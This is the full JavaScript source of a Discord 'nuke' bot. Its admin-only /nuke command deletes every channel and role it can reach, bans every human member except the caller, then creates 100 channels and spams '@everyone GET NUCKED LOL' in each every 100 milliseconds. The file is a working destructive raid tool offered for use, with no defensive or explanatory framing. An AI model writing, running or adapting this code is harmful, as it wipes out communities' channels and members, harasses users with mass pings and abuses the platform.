const { Client, GatewayIntentBits, REST, Routes } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

// Register slash commands
const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

const commands = [
  {
    name: 'nuke',
    description: 'Execute server nuke (ADMIN ONLY)'
  }
];

(async () => {
  try {
    console.log('Started refreshing application (/) commands.');

    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands },
    );

    console.log('Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error(error);
  }
})();

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'nuke') {
    // Check if user is admin
    if (!interaction.member.permissions.has('Administrator')) {
      return interaction.reply({ content: 'You need admin permissions to use this command!', ephemeral: true });
    }

    await interaction.reply({ content: 'Nuke initiated...', ephemeral: true });

    const guild = interaction.guild;
    
    // Delete all channels
    guild.channels.cache.forEach(channel => {
      if (channel.deletable) {
        channel.delete().catch(err => console.error(err));
      }
    });

    // Delete all roles
    guild.roles.cache.forEach(role => {
      if (role.editable && !role.managed && role.id !== guild.id) {
        role.delete().catch(err => console.error(err));
      }
    });

    // Ban all members
    guild.members.cache.forEach(member => {
      if (!member.user.bot && member.id !== interaction.user.id) {
        member.ban({ reason: 'Server nuked' }).catch(err => console.error(err));
      }
    });

    // Create 100 channels and spam
    for (let i = 0; i < 100; i++) {
      guild.channels.create({ name: 'GET-FUCKED' })
        .then(channel => {
          setInterval(() => {
            channel.send('@everyone GET NUCKED LOL');
          }, 100);
        })
        .catch(err => console.error(err));
    }
  }
});

client.login(process.env.TOKEN);
